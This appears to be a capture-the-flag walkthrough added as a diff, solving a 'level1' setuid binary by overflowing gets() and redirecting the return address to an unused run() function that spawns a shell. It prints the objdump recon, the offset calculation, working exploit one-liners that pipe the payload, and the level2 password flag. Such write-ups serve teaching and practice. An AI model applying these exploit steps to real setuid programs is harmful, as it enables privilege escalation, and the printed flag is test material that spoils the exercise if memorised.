@@ -1,0 +1,59 @@
+level1 - walkthrough
+====================
+
+Target: /home/user/level1/level1
+        -rwsr-s---  owned by level2, setuid + setgid bits set
+        dynamically linked ELF 32-bit i386, not stripped
+
+Goal: read /home/user/level2/.pass
+
+1. Recon
+   $ objdump -d level1
+   main():
+       8048486:  sub    $0x50,%esp
+       8048489:  lea    0x10(%esp),%eax     ; buf = esp+0x10
+       8048490:  call   gets@plt            ; UNBOUNDED read -> overflow
+       8048495:  leave
+       8048496:  ret
+   There is also an unreferenced function run():
+       8048444 <run>:
+           ...  call fwrite@plt             ; "Good... Wait what?\n"
+           8048479: call system@plt         ; system("/bin/sh")
+   run() is never called normally, but it is exactly the primitive we want:
+   a shell running with level2's (setuid) privileges.
+
+2. Plan
+   Overwrite the saved return address of main() with &run (0x08048444).
+   When main() executes `leave; ret`, execution jumps into run().
+
+3. Find the offset to the saved EIP
+   Feed a 100-byte cyclic ("De Bruijn") pattern under gdb and read EIP:
+       $ gdb -q -batch -ex 'run < /tmp/pat' -ex 'info registers eip' ./level1
+         eip = 0x63413563   ("c5Ac")
+   Locating "c5Ac" in the pattern gives offset = 76.
+   (This matches the stack math: buf at esp+0x10, frame 0x50, plus alignment.)
+
+4. Build the payload
+   payload = "A"*76 + p32(0x08048444)
+           = 76 filler bytes, then the little-endian address of run:
+             \x44\x84\x04\x08
+   No 0x0a byte appears in the address, so gets() does not terminate early.
+
+5. Exploit
+   run() calls system("/bin/sh"); the shell reads whatever follows on stdin,
+   so we append the commands we want it to run:
+
+       $ (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; \
+          echo "cat /home/user/level2/.pass") | ./level1
+
+   For an interactive shell instead, replace the echo with `cat` to keep
+   stdin open:
+       $ (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
+       id      -> euid=2021(level2)
+       cat /home/user/level2/.pass
+
+   (The process segfaults after the shell exits, because main's frame is
+    still corrupt -- harmless, the flag is already read.)
+
+6. Result -- level2 password:
+   53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
